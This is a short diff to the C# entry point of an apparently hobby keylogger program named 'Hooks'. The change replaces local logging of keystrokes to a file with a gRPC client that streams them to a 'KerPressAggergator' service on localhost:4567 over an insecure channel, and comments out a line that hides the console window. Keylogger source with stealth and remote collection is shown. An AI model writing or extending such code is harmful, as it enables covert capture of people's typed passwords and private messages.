@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Grpc.Core;
+using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
@@ -12,11 +13,16 @@ namespace Hooks
         ///</summary>
         static void Main(string[] args)
         {
+            string addr = "localhost";
+            int port = 4567;
+            var channel = new Channel(addr, port, Credentials.Insecure);
+            var client = HookKeylogger.Base.KerPressAggergator.NewClient(channel);
+            // Put an empty keypress to force the setup of the client.
             var handle = GetConsoleWindow();
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) +"\\keylog";
-            var kl = new KeyLogger(path);
+            var kl = new KeyLogger(client);
             // Hide
-            ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);
 
             Application.Run();
             kl.Deactivate();
